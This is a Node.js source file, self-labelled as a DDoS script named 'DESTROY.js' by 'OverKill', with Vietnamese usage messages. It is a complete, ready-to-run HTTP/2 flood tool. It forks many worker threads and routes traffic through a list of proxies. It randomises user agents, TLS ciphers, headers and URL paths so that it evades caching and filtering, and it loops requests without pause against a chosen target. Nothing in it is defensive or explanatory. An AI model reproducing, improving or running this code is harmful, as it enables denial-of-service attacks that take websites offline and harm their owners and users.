const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],
lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
],
encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
],
controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
],
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).setMaxListeners(0);

function makeid(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
    result += characters.charAt(Math.floor(Math.random() * 
charactersLength));
 }
 return result;
}

function makenum(length) {
  var result           = '';
  var characters       = '0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
    result += characters.charAt(Math.floor(Math.random() * 
charactersLength));
 }
 return result;
}

function makelet(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
    result += characters.charAt(Math.floor(Math.random() * 
charactersLength));
 }
 return result;
}

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}
let target = process.argv[2], time = process.argv[3], thread = process.argv[4];
if (process.argv.length < 5) {
  console.log("\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu");
  console.log("\x1b[36m USAGE\x1b[37m: node DESTROY.js <target> <time> <thread> <proxies>");
  console.log("\x1b[32m EXAMPLE\x1b[37m: node DESTROY.js https://example.com 60 100 proxy.txt");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");

  process.exit();
}

try {
  var proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g);
} 

catch (err) {
  if (err.code !== 'ENOENT') throw err;
  console.log('\x1b[31m ERROR\x1b[37m: Không tìm thấy danh sách proxy');
  console.log("\x1b[36m USAGE\x1b[37m: node DESTROY.js <target> <time> <thread> <proxies>");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");
  process.exit();
}

if (!thread) {
  console.log("\x1b[31m ERROR\x1b[37m: Nhập giá trị Thread sai");
  console.log("\x1b[36m USAGE\x1b[37m: node DESTROY.js <target> <time> <thread> <proxies>");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");
  process.exit();
}

if (isNaN(thread)) {
  console.log("\x1b[31m ERROR\x1b[37m: Hãy nhập Thread");
  console.log("\x1b[36m USAGE\x1b[37m: node DESTROY.js <target> <time> <thread> <proxies>");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");
  process.exit();
}

if (!time) {
  console.log("\x1b[31m ERROR\x1b[37m: Nhập giá trị Time sai");
  console.log("\x1b[36m USAGE\x1b[37m: node DESTROY.js <target> <time> <thread> <proxies>");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");
  process.exit();
}

if (isNaN(time)) {
  console.log("\x1b[31m ERROR\x1b[37m: Hãy nhập Time");
  console.log("\x1b[36m USAGE\x1b[37m: node DESTROY.js <target> <time> <thread> <proxies>");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");
  process.exit();
}

if (!target !== !target.startsWith('http://') && !target.startsWith('https://')) {
  console.log("\x1b[31m ERROR\x1b[37m: Nhập Url sai");
  console.log("\x1b[36m USAGE\x1b[37m: node DESTROY.js <target> <time> <thread> <proxies>");
  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m ");
  process.exit();
}

if(process.argv.length === 7){
  console.log("\x1b[0mSupported options:")
  console.log("   \x1b[0m[\x1b[33mrand\x1b[0m]: random query")
  console.log("   \x1b[0m[\x1b[33mrandln12\x1b[0m]: random query (length of 12)")
  console.log("   \x1b[0m[\x1b[33mrandln16\x1b[0m]: random query (length of 16)")
  console.log("   \x1b[0m[\x1b[33mrandln24\x1b[0m]: random query (length of 24)")
  console.log("   \x1b[0m[\x1b[33mrandln32\x1b[0m]: random query (length of 32)")
  console.log("   \x1b[0m[\x1b[33mrandln64\x1b[0m]: random query (length of 64)")
  console.log("   \x1b[0m[\x1b[33mrandnum12\x1b[0m]: random query with numbers only (length of 12)")
  console.log("   \x1b[0m[\x1b[33mrandnum16\x1b[0m]: random query with numbers only (length of 16)")
  console.log("   \x1b[0m[\x1b[33mrandnum24\x1b[0m]: random query with numbers only (length of 24)")
  console.log("   \x1b[0m[\x1b[33mrandnum32\x1b[0m]: random query with numbers only (length of 32)")
  console.log("   \x1b[0m[\x1b[33mrandnum64\x1b[0m]: random query with numbers only (length of 64)")
  console.log("   \x1b[0m[\x1b[33mrandlet12\x1b[0m]: random query with letters only (length of 12)")
  console.log("   \x1b[0m[\x1b[33mrandlet16\x1b[0m]: random query with letters only (length of 16)")
  console.log("   \x1b[0m[\x1b[33mrandlet24\x1b[0m]: random query with letters only (length of 24)")
  console.log("   \x1b[0m[\x1b[33mrandlet32\x1b[0m]: random query with letters only (length of 32)")
  console.log("   \x1b[0m[\x1b[33mrandlet64\x1b[0m]: random query with letters only (length of 64)")
} else {

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

var log = console.log;

global.logger = function() { 

    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {

        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        return '\x1b[0m[' + ((hour < 10) ? '0' + hour : hour) +':' +((minutes < 10) ? '0' + minutes : minutes) +':' +((seconds < 10) ? '0' + seconds : seconds) +'] ';

    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));

};


if(cluster.isMaster) {
const dateObj = new Date();

    for(var bb=0;bb<thread;bb++) {
        console.log(`Threads ${bb+1} started.`)
        cluster.fork();
    }
    setTimeout(() => {

        process.exit(-1)
    
    }, time * 1000)

}else {
    function flood() {
        var parsed = url.parse(target);
        let path = url.parse(target).path;
        logger(`Parsing ${target}`)
        const uas = fakeua();
        logger(`Building UAs`)
        var cipper = cipher()
        logger(`Building cipher`)
        var proxy = proxyr().split(':')
        logger(`Spliting proxies`)

        if(path === "/[rand]"){
          path = path.replace("/[rand]", "/"+ makeid(12))
        } else if(path === "/[randln12]"){
          path = path.replace("/[randln12]", "/"+ makeid(12))
        } else if(path === "/[randln16]"){
          path = path.replace("/[randln16]", "/"+ makeid(16))
        } else if(path === "/[randln24]"){
          path = path.replace("/[randln24]", "/"+ makeid(24))
        } else if(path === "/[randln32]"){
          path = path.replace("/[randln32]", "/"+ makeid(32))
        } else if(path === "/[randln64]"){
          path = path.replace("/[randln64]", "/"+ makeid(64))
        } else if(path === "/[randnum12]"){
          path = path.replace("/[randnum12]", "/"+ makenum(12))
        } else if(path === "/[randnum16]"){
          path = path.replace("/[randnum16]", "/"+ makenum(16))
        } else if(path === "/[randnum24]"){
          path = path.replace("/[randnum24]", "/"+ makenum(24))
        } else if(path === "/[randnum32]"){
          path = path.replace("/[randnum32]", "/"+ makenum(32))
        } else if(path === "/[randnum64]"){
          path = path.replace("/[randnum64]", "/"+ makenum(64))
        } else if(path === "/[randlet12]"){
          path = path.replace("/[randlet12]", "/"+ makelet(12))
        } else if(path === "/[randlet16]"){
          path = path.replace("/[randlet16]", "/"+ makelet(16))
        } else if(path === "/[randlet24]"){
          path = path.replace("/[randlet24]", "/"+ makelet(24))
        } else if(path === "/[randlet32]"){
          path = path.replace("/[randlet32]", "/"+ makelet(32))
        } else if(path === "/[randlet64]"){
          path = path.replace("/[randlet64]", "/"+ makelet(64))
        }

        var header = {
            ":path": path,
            "X-Forwarded-For": proxy[0],
            "X-Forwarded-Host": proxy[0], 
            ":method": "GET",
            "User-agent": uas,
            "Origin": target,
            "Accept": accept(),
            "Accept-Encoding": encoding(),
            "Accept-Language": lang(),
            "Cache-Control": controling(),
        }
        var obj = JSON.stringify(header)
        
        function req(min,max,interval)
        {
            if (typeof(interval)==='undefined') interval = 1;
            var r = Math.floor(Math.random()*(max-min+interval)/interval);
            return r*interval+min;
        }

        logger(`\x1b[35mPID\x1b[0m: ${process.pid}`)
        logger(`\x1b[36mProxy\x1b[0m: ${proxy[0]}:${proxy[1]}`)
        logger(`\x1b[31mAvg\x1b[0m: ${req(60,1999)} req/s`)
        logger(`\x1b[32mVerbose\x1b[0m: ${parsed.host}${path} - ${time} seconds`)

        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 10000,
            maxSockets: 0,
        });
                
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host+':443'
        }, function(){ 
            req.setSocketKeepAlive(true);
        });
    
        req.on('connect', function (res, socket, head) { 
        
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: cipper, 
                    secureProtocol: 'TLS_method',
                    TLS_MAX_VERSION: '1.2',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: socket
                }, function () {
                    for (let i = 0; i< 200; i++){
                        setInterval(() => {
                          const req = client.request(header);
                          req.setEncoding('utf8');
  
                          req.on('data', (chunk) => {
                              // data += chunk;
                          });
                          req.on("response", () => {
                              req.close();
                          })
                          req.end();
                        })
                    }
                })
            });
        });

        req.end();

    }

    setInterval(() => { flood() })
  }
}
